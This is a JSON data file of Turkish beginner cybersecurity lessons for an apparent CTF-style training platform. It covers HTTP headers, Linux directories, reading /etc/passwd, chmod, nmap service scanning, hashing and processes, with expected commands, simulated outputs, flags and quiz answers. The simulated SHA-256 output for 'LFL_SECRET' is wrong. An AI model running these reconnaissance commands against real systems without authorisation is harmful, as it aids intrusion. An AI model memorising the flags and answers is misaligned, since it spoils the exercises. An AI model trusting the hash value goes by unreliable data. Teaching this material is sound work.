        "hintExplanation": "<p><strong>curl:</strong> Komut satırından web istekleri atmamızı sağlayan İsviçre çakısıdır.</p><p><strong>-I:</strong> Sitenin tüm HTML gövdesini indirmek yerine sadece sunucunun verdiği yanıt başlığını (HTTP Status & Headers) gösterir.</p>",
        "terminalSuccessOutput": "HTTP/1.1 200 OK\nDate: Sun, 08 Nov 2026 17:35:10 GMT\nContent-Type: application/json; charset=utf-8\nServer: Kestrel (Banner-Redacted)\nX-Frame-Options: DENY\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nLFL-Status: Healthy-ZeroTrust-Active\n\n[DURUM KODU: 200 OK] Sunucu HTTP başlıkları başarıyla analiz edildi!\n[FLAG] LFL{starter_http_status_codes_and_headers_master}",
        "flag": "LFL{starter_http_status_codes_and_headers_master}",
        "nextId": "starter-06",
        "whyWeUse": "Bir web sitesine tarayıcıyla girdiğinde arka planda sunucu senin tarayıcına gizli bir **kimlik kartı (HTTP Başlıkları / Headers)** gönderir. Bu başlıklarda sunucunun durumu (`200 OK`), hangi web programını çalıştırdığı (`Server: Kestrel`) ve hangi güvenlik kalkanlarının aktif olduğu yazar. Tarayıcıda görünmeyen bu teknik arka planı 1 saniyede görmek için `curl -I` komutunu kullanırız.",
        "cmdAnatomy": [
            {
                "token": "curl",
                "role": "Ana Komut",
                "desc": "Terminal üzerinden web sunucularına bağlanıp veri alışverişi yapan güçlü web aracıdır."
            },
            {
                "token": "-I",
                "role": "Parametre (Sadece Başlıklar)",
                "desc": "Büyük 'I' harfi sunucuya `HEAD` isteği gönderir; yani 'Sayfanın tüm kodlarını indirme, sadece teknik kimlik bilgilerini (HTTP Header) göster' der."
            },
            {
                "token": "https://api.lfl.corp/health",
                "role": "Hedef URL",
                "desc": "Başlık ve sağlık durumunu kontrol etmek istediğimiz web adresi."
            }
        ],
        "outputGuide": [
            {
                "snippet": "HTTP/1.1 200 OK",
                "meaning": "`200 OK` durum kodu sunucunun ayakta olduğunu ve isteğimize başarıyla yanıt verdiğini gösterir."
            },
            {
                "snippet": "Server: Kestrel (Banner-Redacted)",
                "meaning": "Web sunucusunun altyapısını (`Kestrel`) gösterir; sürüm numarasının gizlenmiş (`Redacted`) olması iyi bir güvenlik önlemidir."
            },
            {
                "snippet": "X-Frame-Options: DENY",
                "meaning": "Bu sitenin başka bir sahte site içine gömülerek (Clickjacking saldırısı) kullanılmasını engelleyen güvenlik başlığıdır."
            },
            {
                "snippet": "Strict-Transport-Security: max-age=31536000",
                "meaning": "**HSTS:** Tarayıcıya 'Bu siteye asla şifresiz HTTP ile bağlanma, her zaman güvenli HTTPS kullan' emri veren başlıktır."
            }
        ],
        "beginnerTerms": [
            {
                "term": "HTTP Header (Başlık)",
                "desc": "Web tarayıcısı ile sunucu arasında sayfa içeriğinden önce gönderilen teknik kimlik ve güvenlik kurallarıdır."
            },
            {
                "term": "HTTP Durum Kodları",
                "desc": "200 = Başarılı, 301 = Yönlendirme, 401 = Yetkisiz, 403 = Yasak, 404 = Bulunamadı, 500 = Sunucu Hatası."
            }
        ],
        "quickCheck": {
            "question": "`curl` komutuna `-I` parametresi eklemek ne işe yarar?",
            "options": [
                "Sayfanın tamamını indirmek yerine sadece HTTP sunucu başlıklarını (Headers) ve durum kodunu (200 OK vb.) getirir",
                "Web sitesini siler",
                "İnternet bağlantısını kapatır"
            ],
            "answer": 0,
            "explanation": "Tam isabet! `-I` parametresi sadece HTTP başlıklarını çekerek sunucu teknolojisini ve güvenlik önlemlerini hızlıca analiz etmemizi sağlar."
        }
    },
    {
        "id": "starter-06",
        "track": "starter",
        "title": "Linux Mimarisi: Dizin Hiyerarşisi & Dosya Mantığı",
        "level": "0. Temel Altyapı",
        "badge": "LINUX DIRECTORY HIERARCHY",
        "theory": "### Linux Dünyasında Her Şey Bir Dosyadır\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nWindows işletim sistemi bir apartmandır; C:\\ diski zemin kat, D:\\ diski birinci kattır. Linux ise tek bir devasa ağaçtır. Ağacın en altındaki kök **`/`** simgesidir. Ne varsa bu kökün üzerindeki dallarda asılıdır. Hatta klavyeniz, fareniz ve ağ kartınız bile Linux için `/dev` klasöründe duran bir dosyadan ibarettir!\n\n#### Kritik Linux Klasörleri:\n* **`/bin` & `/usr/bin`:** Sistemde çalıştırabileceğiniz temel programlar (`ls`, `cat`, `nmap` vb.).\n* **`/etc`:** Sistemin ve tüm programların ayar (konfigürasyon) dosyaları.\n* **`/var/log`:** Güvenlik logları ve web sunucu günlükleri (Saldırı delilleri burada toplanır).\n* **`/home`:** Normal kullanıcıların masaüstü ve kişisel belgeleri.\n* **`/root`:** Süper kullanıcı (Root) yöneticisinin özel evi.",
        "mission": "ls -la / komutunu kullanarak kök dizindeki (/) tüm sistem klasörlerini ayrıntılı olarak listeleyin.",
        "expectedCommand": "ls -la /",
        "acceptedCommands": [
            "ls -la /",
            "ls -l /",
            "ls -a /",
            "ls /"
        ],
        "hintExplanation": "<p><strong>ls:</strong> 'List' kelimesinden gelir, klasör içeriğini listeler.</p><p><strong>-l:</strong> Uzun (long) formatta gösterir; dosya boyutlarını, sahiplerini ve izinlerini yazar.</p><p><strong>-a:</strong> Gizli (nokta ile başlayan) dosyaları da gösterir.</p><p><strong>/:</strong> Bilgisayarın en üst kök dizinini hedefler.</p>",
        "terminalSuccessOutput": "total 64\ndrwxr-xr-x  18 root root  4096 Nov  8 00:00 .\ndrwxr-xr-x  18 root root  4096 Nov  8 00:00 ..\nlrwxrwxrwx   1 root root     7 Nov  8 00:00 bin -> usr/bin\ndrwxr-xr-x   2 root root  4096 Nov  8 00:00 boot\ndrwxr-xr-x   5 root root  4096 Nov  8 00:00 dev\ndrwxr-xr-x 135 root root 12288 Nov  8 00:00 etc (Ayarlar)\ndrwxr-xr-x   3 root root  4096 Nov  8 00:00 home\ndrwx------   8 root root  4096 Nov  8 00:00 root\ndrwxr-xr-x  14 root root  4096 Nov  8 00:00 var (Loglar)\n[BAŞARILI] Linux kök dizin hiyerarşisi başarıyla çözümlendi!\n[FLAG] LFL{starter_linux_root_hierarchy_mapped}",
        "flag": "LFL{starter_linux_root_hierarchy_mapped}",
        "nextId": "starter-07",
        "whyWeUse": "Linux bir siber güvenlik uzmanının ana işletim sistemidir. Bir Linux sunucuya girdiğimizde nerede ne var bilmek zorundayız: Ayarlar `/etc` içinde, loglar `/var/log` içinde, kullanıcı dosyaları `/home` içindedir. En üstteki ana kök klasörün (`/`) içinde hangi sistem klasörlerinin bulunduğunu, gizli dosyaları ve kimlere ait olduklarını tek bakışta görmek için `ls -la /` komutunu kullanırız.",
        "cmdAnatomy": [
            {
                "token": "ls",
                "role": "Ana Komut (List)",
                "desc": "'List' kelimesinin kısaltmasıdır; klasörün içindeki dosya ve dizinleri ekrana listeler."
            },
            {
                "token": "-la",
                "role": "Birleşik Parametre (-l ve -a)",
                "desc": "• `-l` (Long): İzinleri, dosya sahibini, boyutu ve tarihi detaylı liste olarak gösterir.\n• `-a` (All): Başında nokta (`.`) olan gizli dosya ve klasörleri de gösterir."
            },
            {
                "token": "/",
                "role": "Hedef Klasör (Kök / Root Dizini)",
                "desc": "Linux dosya sisteminin en tepesindeki başlangıç noktasıdır (tüm diğer klasörler bunun içindedir)."
            }
        ],
        "outputGuide": [
            {
                "snippet": "drwxr-xr-x ... root root ... etc",
                "meaning": "Başındaki `d` harfi bunun bir klasör (directory) olduğunu, sahibinin `root` olduğunu ve adının `etc` (tüm sistem ayarlarının durduğu klasör) olduğunu gösterir."
            },
            {
                "snippet": "drwx------ ... root root ... root",
                "meaning": "`drwx------`: Sadece `root` yöneticisinin girebildiği, diğer tüm kullanıcılara tamamen kapalı (`------`) özel yönetici klasörüdür."
            },
            {
                "snippet": "drwxr-xr-x ... root root ... var",
                "meaning": "`var` klasörü: İçindeki `/var/log` alt klasöründe sistemdeki tüm giriş denemeleri ve güvenlik kayıtları (loglar) tutulur."
            }
        ],
        "beginnerTerms": [
            {
                "term": "/ (Kök / Root Dizini)",
                "desc": "Linux'taki tüm klasör ağacının başladığı en üst noktadır."
            },
            {
                "term": "/etc ve /var/log",
                "desc": "/etc sistem ayar ve şifre dosyalarını; /var/log ise güvenlik kamera kayıtları gibi tüm sistem loglarını barındırır."
            },
            {
                "term": "Gizli Dosya (. ile başlayan)",
                "desc": "Linux'ta adı nokta ile başlayan dosyalar (ör. .bashrc, .ssh) normalde gizlidir; sadece `ls -a` ile görünür."
            }
        ],
        "quickCheck": {
            "question": "Linux'ta sistem ayar dosyaları ve güvenlik logları sırasıyla hangi iki klasörde tutulur?",
            "options": [
                "Ayarlar /etc klasöründe, loglar /var/log klasöründe",
                "İkisi de Çöp Kutusu'nda",
                "Sadece Masaüstü klasöründe"
            ],
            "answer": 0,
            "explanation": "Doğru! `/etc` konfigürasyon (ayar) dosyalarının, `/var/log` ise olay ve güvenlik günlüklerinin (logların) standart adresidir."
        }
    },
    {
        "id": "starter-07",
        "track": "starter",
        "title": "Terminal Büyü Değildir: Dizinler Arasında Gezinme & Filtreleme",
        "level": "0. Temel Altyapı",
        "badge": "TERMINAL CLI & PIPELINE (|)",
        "theory": "### Hackerlar Neden Fare Kullanmaz?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir kütüphanede 10.000 kitap var. Elinizle tek tek raflara bakıp 'içinde siber kelimesi geçen kitapları' bulmak saatler sürer (Grafik arayüz). Ama kütüphane görevlisinin mikrofonuna 'Bana içinde siber geçen kitapları getir' derseniz saniyede önünüze koyar (Terminal komutu).\n\nTerminal büyü değildir; işletim sistemine klavyeyle doğrudan fısıldamaktır.\n\n#### 5 Altın Linux Komutu:\n1. **`pwd` (Print Working Directory):** Şu an hangi klasörün içindeyim?\n2. **`cd` (Change Directory):** Klasör değiştir, içeri gir (`cd /var/log` veya geri çık `cd ..`).\n3. **`cat` (Concatenate):** Bir dosyanın içindeki metni terminal ekranına yazdır.\n4. **`grep`:** Binlerce satır metin içinde kelime arayıp süzen filtre.\n5. **Boru Hattı (`|` Pipe):** Bir komutun çıktısını diğer komutun ağzına doğrudan besler (`cat dosya.txt | grep aranan`).",
        "mission": "cat /etc/passwd | grep root komutunu kullanarak kullanıcılar listesinden yalnızca root hesabını filtreleyin.",
        "expectedCommand": "cat /etc/passwd | grep root",
        "acceptedCommands": [
            "cat /etc/passwd | grep root",
            "grep root /etc/passwd",
            "grep 'root' /etc/passwd"
        ],
        "hintExplanation": "<p><strong>cat /etc/passwd:</strong> Linux sistemindeki kayıtlı kullanıcıların listesini ekrana döker.</p><p><strong>| (Boru Hattı):</strong> İlk komutun dökümünü alıp sonraki komuta gönderir.</p><p><strong>grep root:</strong> Ekrana yüzlerce satır yerine sadece içinde 'root' kelimesi geçen satırı yazdırır.</p>",
        "terminalSuccessOutput": "root:x:0:0:root:/root:/bin/bash\n[FILTRE BAŞARILI] Sistem yöneticisi (UID=0 root) hesabı boru hattı ile filtrelendi!\n[FLAG] LFL{starter_cli_pipeline_cat_grep_unlocked}",
        "flag": "LFL{starter_cli_pipeline_cat_grep_unlocked}",
        "nextId": "starter-08",
        "whyWeUse": "Gerçek hayatta bir dosyada yüzlerce kullanıcı veya binlerce satır yazı olur. Gözle tek tek okumak yerine Linux'un en güçlü özelliğini kullanırız: **Boru Hattı (`|` Pipe)**. Önce `cat /etc/passwd` ile sistemdeki tüm kullanıcı listesini okuruz, araya `|` koyarak bu listeyi `grep root` komutuna aktarırız ve ekrana yüzlerce satır yerine **sadece `root` geçen satırın** süzülüp gelmesini sağlarız!",
        "cmdAnatomy": [
            {
                "token": "cat",
                "role": "1. Komut (Dosya Oku)",
                "desc": "Belirtilen dosyanın içindeki tüm metni okur."
            },
            {
                "token": "/etc/passwd",
                "role": "Hedef Dosya",
                "desc": "Linux sisteminde kayıtlı tüm kullanıcı hesaplarının listelendiği standart sistem dosyasıdır."
            },
            {
                "token": "|",
                "role": "Boru İşareti (Pipe)",
                "desc": "Sol taraftaki `cat` komutunun çıktısını alır, ekrana basmak yerine sağ taraftaki `grep` komutuna gönderir."
            },
            {
                "token": "grep",
                "role": "2. Komut (Kelime Filtrele)",
                "desc": "Gelen metin yığını içinde sadece aradığımız kelimeyi içeren satırları süzer."
            },
            {
                "token": "root",
                "role": "Aranan Kelime",
                "desc": "İçinde `root` geçen satırları filtrelemek istediğimizi belirtir."
            }
        ],
        "outputGuide": [
            {
                "snippet": "root:x:0:0:root:/root:/bin/bash",
                "meaning": "Bu tek satır 7 bilgiyi iki nokta (`:`) ile ayırır:\n1. `root`: Kullanıcı adı\n2. `x`: Şifrenin `/etc/shadow` dosyasında gizli olduğu\n3. `0`: **UID (Kullanıcı Numarası)** — `0` her zaman en yetkili yönetici demektir!\n4. `/root`: Ev klasörü\n5. `/bin/bash`: Kullandığı komut satırı kabuğu."
            }
        ],
        "beginnerTerms": [
            {
                "term": "Pipe / Boru (|)",
                "desc": "İki komutu birbirine bağlayan köprüdür; birinci komutun çıktısını ikinci komuta girdi yapar."
            },
            {
                "term": "/etc/passwd",
                "desc": "Sistemdeki tüm kullanıcıların isimlerini, UID numaralarını ve ev klasörlerini tutan dosyadır."
            },
            {
                "term": "UID 0 (Root)",
                "desc": "Linux'ta kullanıcı numarası (UID) 0 olan hesap, sistemin mutlak hakimi olan Root yöneticisidir."
            }
        ],
        "quickCheck": {
            "question": "`cat /etc/passwd | grep root` komutundaki `|` (boru) işareti tam olarak ne yapar?",
            "options": [
                "`cat` komutunun okuduğu dosya içeriğini filtrelemek üzere `grep` komutuna aktarır",
                "Dosyayı ikiye bölüp siler",
                "Bilgisayarı yeniden başlatır"
            ],
            "answer": 0,
            "explanation": "Süper! Pipe (`|`) operatörü Linux'un kalbidir; küçük komutları lego gibi birleştirip devasa verileri saniyede süzmemizi sağlar."
        }
    },
    {
        "id": "starter-08",
        "track": "starter",
        "title": "Yetki Güvenliği: Dosya İzinleri (rwx) & chmod 700",
        "level": "0. Temel Altyapı",
        "badge": "FILE PERMISSIONS & PRIVILEGES",
        "theory": "### Kim, Hangi Dosyaya Ne Yapabilir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nÖzel günlüğünüzü şifreli kasanızda tutmanız **`chmod 700`**'dür (Yalnızca siz açıp okuyabilirsiniz). Günlüğü okulun ilan panosuna asmanız ise **`chmod 777`**'dir (Yoldan geçen herkes okur, sayfayı karalar, yırtıp çöpe atar). Siber güvenlikte en büyük felaketler gereksiz 777 yetkisi vermekten doğar!\n\nLinux'ta her dosyanın 3 aktörü vardır:\n1. **Kullanıcı (u - User):** Dosyayı oluşturan kişi.\n2. **Grup (g - Group):** Dosyaya erişimi olan ekip.\n3. **Diğerleri (o - Others):** Bilgisayardaki geri kalan herkes.\n\n#### İzinlerin Sayısal Karşılığı:\n* **Okuma (r - Read):** `4` puan\n* **Yazma/Değiştirme (w - Write):** `2` puan\n* **Çalıştırma (x - Execute):** `1` puan\n* Toplam: 4 + 2 + 1 = `7` (Tam yetki). `chmod 700 dosya.sh` dediğinizde sahibine 7, grup ve diğerlerine 0 puan vererek dosyayı tamamen kilitlersiniz.",
        "mission": "chmod 700 backup.sh komutunu kullanarak kritik yedekleme dosyasını diğer tüm kullanıcılara kapatın.",
        "expectedCommand": "chmod 700 backup.sh",
        "acceptedCommands": [
            "chmod 700 backup.sh",
            "chmod u=rwx,go= backup.sh"
        ],
        "hintExplanation": "<p><strong>chmod:</strong> 'Change Mode' demektir, dosya erişim haklarını değiştirir.</p><p><strong>700:</strong> Dosyanın sahibine tam okuma/yazma/çalıştırma hakkı (7) verirken, diğer tüm kullanıcılara sıfır (0) yetki vererek dosyayı güvenliğe alır.</p>",
        "terminalSuccessOutput": "[+] İZİNLER GÜNCELLENDİ: backup.sh\nEski İzin: -rwxrwxrwx (777 - GÜVENSİZ!)\nYeni İzin: -rwx------ (700 - ZIRHLI & KORUMALI)\n[FLAG] LFL{starter_chmod_permission_hardening_secured}",
        "flag": "LFL{starter_chmod_permission_hardening_secured}",
        "nextId": "starter-09",
        "whyWeUse": "Bir sunucuda yedekleme scripti (`backup.sh`) veya özel şifre anahtarı herkes tarafından okunabilir ve değiştirilebilir (`777` / `-rwxrwxrwx`) bırakılırsa, sisteme giren sıradan bir kullanıcı bu dosyanın içine zararlı kod ekleyip tüm sunucuyu ele geçirebilir! Bu yüzden kritik dosyaları sadece sahibi okuyup çalıştıracak, diğer herkes için tamamen kilitli olacak şekilde `chmod 700` ile zırhlarız.",
        "cmdAnatomy": [
            {
                "token": "chmod",
                "role": "Ana Komut (Change Mode)",
                "desc": "Dosya veya klasörlerin okuma, yazma ve çalıştırma izinlerini değiştiren komuttur."
            },
            {
                "token": "700",
                "role": "Sayısal İzin Kodu",
                "desc": "3 rakam sırasıyla Sahibi (7), Grup (0) ve Diğerleri (0) içindir:\n• `7` (4+2+1): Dosya sahibine Okuma + Yazma + Çalıştırma tam yetkisi verir.\n• `0`: Grup üyelerine tüm izinleri kapatır.\n• `0`: Diğer tüm kullanıcılara tüm izinleri kapatır."
            },
            {
                "token": "backup.sh",
                "role": "Hedef Dosya",
                "desc": "Yetkilerini güvenli hale getirdiğimiz yedekleme dosyasıdır."
            }
        ],
        "outputGuide": [
            {
                "snippet": "Eski İzin: -rwxrwxrwx (777 - GÜVENSİZ!)",
                "meaning": "Herkesin (`rwx` `rwx` `rwx`) dosyayı okuyabildiği, değiştirebildiği ve çalıştırabildiği çok tehlikeli durumdur."
            },
            {
                "snippet": "Yeni İzin: -rwx------ (700 - ZIRHLI & KORUMALI)",
                "meaning": "İlk `rwx` dosya sahibinin tam yetkisini, sonrasındaki `------` ise diğer hiç kimsenin bu dosyaya dokunamayacağını gösterir."
            }
        ],
        "beginnerTerms": [
            {
                "term": "r, w, x (4, 2, 1)",
                "desc": "r = Read (Okuma: 4 puan), w = Write (Yazma: 2 puan), x = Execute (Çalıştırma: 1 puan). Toplamı 7 eder."
            },
            {
                "term": "chmod 777 vs 700",
                "desc": "777 dosyayı dünyadaki herkese açar (çok tehlikeli); 700 ise sadece dosyanın sahibine açıp diğer herkese kilitler."
            }
        ],
        "quickCheck": {
            "question": "`chmod 700 backup.sh` komutundaki `7`, `0`, `0` rakamları sırasıyla kimlerin yetkisini belirler?",
            "options": [
                "1. rakam (7) Dosya Sahibi, 2. rakam (0) Grup, 3. rakam (0) Diğer tüm kullanıcılar",
                "7 gün, 0 saat, 0 dakika sonra silinmesini",
                "Dosya boyutunun 700 MB olmasını"
            ],
            "answer": 0,
            "explanation": "Çok doğru! Linux izinlerinde 3 hane her zaman sırasıyla: **User (Sahibi) - Group (Grup) - Others (Diğerleri)** şeklindedir."
        }
    },
    {
        "id": "starter-09",
        "track": "starter",
        "title": "İlk Siber Araç: Nmap ile Servis & Port Keşfi",
        "level": "0. Temel Altyapı",
        "badge": "NMAP PORT RECONNAISSANCE",
        "theory": "### Nmap (Network Mapper) Nedir?\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir dedektifin sokaktaki 50 dükkanın kapı kollarını tek tek yoklayıp deftere '1 numaralı dükkan eczane ve kapısı açık, 2 numaralı dükkan banka ve kapısı kilitli' diye not alması gibidir.\n\nSiber güvenlikte bir sistemi incelemeden önce o sistemin hangi kapılarının (portlarının) açık olduğunu ve arkasında hangi programların çalıştığını bilmemiz gerekir. Nmap, dünyanın en popüler açık kaynak ağ keşif aracıdır.\n\n#### Nmap Temel Bayrakları:\n* **`-sV` (Service Version):** Açık portun arkasındaki programın tam sürümünü öğrenir (Örn: Apache 2.4.41 mi, OpenSSH 8.2 mi?). Saldırganlar sürüme özel zafiyet arar.\n* **`-p` (Port):** Belirli portları tarar (Örn: `-p 80,443`).\n* **`-Pn`:** Ping yanıtı vermeyen gizlenmiş sunucuları doğrudan tarar.",
        "mission": "nmap -sV 10.10.1.5 komutunu kullanarak hedef sunucunun açık servislerini ve sürümlerini tarayın.",
        "expectedCommand": "nmap -sV 10.10.1.5",
        "acceptedCommands": [
            "nmap -sV 10.10.1.5",
            "nmap -sV -p- 10.10.1.5",
            "nmap 10.10.1.5"
        ],
        "hintExplanation": "<p><strong>nmap:</strong> Ağ tarayıcısı komutudur.</p><p><strong>-sV:</strong> Kapının açık olduğunu söylemekle kalmaz, çalışan uygulamanın versiyonunu da tespit eder.</p><p><strong>10.10.1.5:</strong> Hedef sistemin IP adresidir.</p>",
        "terminalSuccessOutput": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for target-node-01 (10.10.1.5)\nHost is up (0.00042s latency).\nNot shown: 996 closed tcp ports\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))\n443/tcp open  ssl/http Apache httpd 2.4.52\n8080/tcp open  http-proxy LFL Interactive Gateway v3.2\n\nNmap done: 1 IP address (1 host up) scanned in 1.24 seconds\n[TARAMA TAMAMLANDI] Açık servisler ve sürümler başarıyla listelendi!\n[FLAG] LFL{starter_first_nmap_recon_completed_ok}",
        "flag": "LFL{starter_first_nmap_recon_completed_ok}",
        "nextId": "starter-10",
        "whyWeUse": "Bir hedef sunucuyu korurken veya sızma testi yaparken dışarıdan bakıldığında hangi kapıların (portların) açık olduğunu ve o kapıların arkasında **hangi programın hangi versiyonunun** çalıştığını bilmemiz gerekir. `nmap -sV` komutu hedefin kapılarını tek tek yoklar ve içerideki servislerin tam sürümünü (örneğin `Apache 2.4.52`, `OpenSSH 8.9p1`) bize raporlar.",
        "cmdAnatomy": [
            {
                "token": "nmap",
                "role": "Ana Komut (Network Mapper)",
                "desc": "Dünyanın en yaygın kullanılan ağ keşif ve port tarama aracıdır."
            },
            {
                "token": "-sV",
                "role": "Parametre (Service Version)",
                "desc": "Açık olan portlarla konuşarak arkasında çalışan yazılımın tam adını ve sürüm (versiyon) numarasını tespit eder."
            },
            {
                "token": "10.10.1.5",
                "role": "Hedef IP Adresi",
                "desc": "Taramak istediğimiz sunucunun IP adresidir."
            }
        ],
        "outputGuide": [
            {
                "snippet": "22/tcp open ssh OpenSSH 8.9p1 Ubuntu",
                "meaning": "22 numaralı TCP kapısı **AÇIK (`open`)** ve arkasında Ubuntu üzerinde `OpenSSH 8.9p1` uzak bağlantı servisi çalışıyor."
            },
            {
                "snippet": "80/tcp open http Apache httpd 2.4.52",
                "meaning": "80 numaralı web kapısı açık ve `Apache 2.4.52` web sunucusu çalışıyor."
            },
            {
                "snippet": "8080/tcp open http-proxy LFL Interactive Gateway v3.2",
                "meaning": "Standart dışı `8080` portunda özel bir web servisi (`LFL Interactive Gateway v3.2`) çalıştığını keşfettik!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "Port Tarama (Port Scanning)",
                "desc": "Hedef sunucudaki 65.535 kapıyı yoklayarak hangilerinin açık (open) veya kapalı (closed) olduğunu bulma işlemidir."
            },
            {
                "term": "Banner Grabbing (-sV)",
                "desc": "Açık porttaki servise bağlanıp 'Sen hangi programsın ve sürümün kaç?' bilgisini çekme tekniğidir."
            }
        ],
        "quickCheck": {
            "question": "Normal `nmap 10.10.1.5` yerine `nmap -sV 10.10.1.5` yazmanın bize sağladığı ekstra avantaj nedir?",
            "options": [
                "Sadece portun açık olduğunu değil, o portta çalışan programın tam sürüm numarasını (Örn: Apache 2.4.52) da gösterir",
                "Tarama hızını 100 kat artırır",
                "Hedef sunucunun elektriğini keser"
            ],
            "answer": 0,
            "explanation": "Harika! `-sV` (Service Version) parametresi olmadan sadece '80 portu http' yazar; `-sV` ile tam yazılım sürümünü öğrenip o sürüme ait güvenlik açıklarını araştırabiliriz."
        }
    },
    {
        "id": "starter-10",
        "track": "starter",
        "title": "Kriptografi Temelleri: Hashing vs Encoding vs Encryption",
        "level": "0. Temel Altyapı",
        "badge": "CRYPTOGRAPHY & HASHING",
        "theory": "### En Çok Karıştırılan 3 Kavramın Anatomisi\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\n* **1. Encoding (Mors Alfabesi):** Şifreleme DEĞİLDİR! Türkçe bir kelimeyi Mors alfabesine çevirirseniz Mors bilen herkes anında okur. Gizlilik sağlamaz, makinelerin veriyi rahat taşıması içindir (Örn: Base64).\n* **2. Hashing (Kıyma Makinesi):** Tek yönlü matematiksel özettir. Eti kıyma makinesine atıp köfte yaparsınız ama köfteyi tekrar eski canlı ete dönüştüremezsiniz. Kullanıcı şifreleri veritabanına asla açık metin yazılmaz, hash olarak saklanır (Örn: SHA-256, BCrypt).\n* **3. Encryption (Çelik Kasa):** Gizli anahtarla kilitlenen şifrelemedir. Yalnızca elinde doğru şifre çözme anahtarı (Private Key) olan kişi kasayı açıp içindeki gerçek veriyi okuyabilir (Örn: AES-256, RSA).\n\n#### Hashing Neden Asla Geri Dönmez?\nHash algoritmaları tek yönlü matematiksel fonksiyondur. 1 kelimelik metin de verseniz, 1000 sayfalık kitap da verseniz tam 64 karakterlik sabit bir özet üretir.",
        "mission": "echo 'LFL_SECRET' | sha256sum komutunu kullanarak gizli metnin tek yönlü SHA-256 kriptografik özetini üretin.",
        "expectedCommand": "echo 'LFL_SECRET' | sha256sum",
        "acceptedCommands": [
            "echo 'LFL_SECRET' | sha256sum",
            "echo \"LFL_SECRET\" | sha256sum",
            "echo LFL_SECRET | sha256sum"
        ],
        "hintExplanation": "<p><strong>echo:</strong> Ekrana metin basar.</p><p><strong>| (Boru Hattı):</strong> Bu metni hash hesaplayıcıya aktarır.</p><p><strong>sha256sum:</strong> Metnin 256-bit (64 haneli onaltılık) geri dönüştürülemez güvenli matematiksel özetini hesaplar.</p>",
        "terminalSuccessOutput": "b5bb9d8014a0f9b1d61e21e796d78dccdf1352f23cd32812f4850b878ae4944c  -\n[TEBRİKLER!] SHA-256 Kriptografik Özeti başarıyla üretildi!\n[MÜFREDAT TAMAMLANDI] 10 Temel Starter Odasını başarıyla bitirdiniz!\n[FLAG] LFL{starter_crypto_hash_vs_encoding_mastered}",
        "flag": "LFL{starter_crypto_hash_vs_encoding_mastered}",
        "nextId": "starter-11",
        "whyWeUse": "Siber güvenlikte kullanıcı parolaları veritabanında asla açık metin (`123456` gibi) saklanmaz ve indirilen bir dosyanın yolda virüsle değiştirilip değiştirilmediği kontrol edilmek istenir. Bunun için **Hash (Tek Yönlü Kriptografik Özet)** kullanılır. `sha256sum` komutu verilen metni alır ve geri döndürülemez 64 karakterlik benzersiz bir dijital parmak izine dönüştürür.",
        "cmdAnatomy": [
            {
                "token": "echo",
                "role": "1. Komut (Metin Üret)",
                "desc": "Tırnak içindeki metni üretir."
            },
            {
                "token": "'LFL_SECRET'",
                "role": "Veri (Gizli Metin)",
                "desc": "Özetini (hash değerini) hesaplamak istediğimiz metindir."
            },
            {
                "token": "|",
                "role": "Boru İşareti (Pipe)",
                "desc": "`echo` komutunun ürettiği metni doğrudan `sha256sum` aracına aktarır."
            },
            {
                "token": "sha256sum",
                "role": "2. Komut (SHA-256 Hesapla)",
                "desc": "Gelen verinin 256-bitlik (64 karakterli) tek yönlü SHA-256 özetini hesaplar."
            }
        ],
        "outputGuide": [
            {
                "snippet": "b5bb9d8014a0f9b1d61e21e796d78dccdf1352f23cd32812f4850b878ae4944c  -",
                "meaning": "Bu 64 haneli kod `LFL_SECRET` kelimesinin SHA-256 parmak izidir. Metindeki tek bir harf bile değişse bu kod baştan aşağı tamamen değişir!"
            }
        ],
        "beginnerTerms": [
            {
                "term": "Hashing (Özetleme)",
                "desc": "Veriyi sabit uzunlukta benzersiz bir parmak izine çeviren TEK YÖNLÜ işlemdir; hash'ten geriye orijinal metin elde edilemez."
            },
            {
                "term": "Encoding (Kodlama - Base64)",
                "desc": "Gizlilik sağlamaz! Veriyi farklı karakterlerle ifade eder, herkes anında geri çözebilir."
            },
            {
                "term": "Encryption (Şifreleme - AES/RSA)",
                "desc": "ÇİFT YÖNLÜDÜR; gizli anahtarla şifrelenir ve sadece anahtara sahip olan kişi geri çözebilir."
            }
        ],
        "quickCheck": {
            "question": "Hashing (SHA-256) ile Encryption (AES Şifreleme) arasındaki en temel fark nedir?",
            "options": [
                "Hashing tek yönlüdür (geri çözülemez), Encryption ise anahtarla geri çözülebilir",
                "İkisi de tamamen aynı şeydir",
                "Hashing sadece resim dosyalarında çalışır"
            ],
            "answer": 0,
            "explanation": "Mükemmel! Hashing kıyma makinesi gibidir (tek yönlüdür, bütünlük ve parola doğrulama için kullanılır); Encryption ise kilitli kasa gibidir (anahtarla geri açılabilir)."
        }
    },
    {
        "id": "starter-11",
        "track": "starter",
        "title": "Linux Süreçleri (Processes): ps, top, kill ve PID Anatomisi",
        "level": "0. Temel Altyapı",
        "badge": "PROCESS ARCHITECTURE & PID",
        "theory": "### Bilgisayarın İçindeki Canlılar: Prosesler (Processes)\n\n💡 **GÜNLÜK HAYATTAN BENZETME:**\nBir restorandaki her çalışanın yakasında benzersiz bir numara (PID - Process ID) vardır. Aşçı, garson, kasiyer... Kimin ne kadar yorulduğunu (CPU), tezgahta ne kadar yer kapladığını (Bellek) restoran müdürü (Kernel) bu yaka kartlarına bakarak denetler. Kontrolden çıkan veya müşterilere zarar veren bir garson olursa müdür anında kovma talimatı verir (`kill`).\n\n#### Temel Kavramlar:\n* **PID (Process ID):** Her çalışan programa işletim sistemi tarafından verilen benzersiz kimlik numarasıdır.\n* **ps aux:** Sistemde o an çalışan TÜM prosesleri (kullanıcı, PID, CPU%, Bellek%, çalışan komut) listeler.\n* **kill -9 [PID]:** Donmuş, kontrolden çıkmış veya zararlı bir prosesi işletim sistemi çekirdeğine sinyal göndererek anında sonlandırır.",
        "mission": "Sistemde çalışan tüm süreçleri kullanıcı adları ve PID numaralarıyla birlikte listelemek için ps aux komutunu çalıştırın.",
        "expectedCommand": "ps aux",
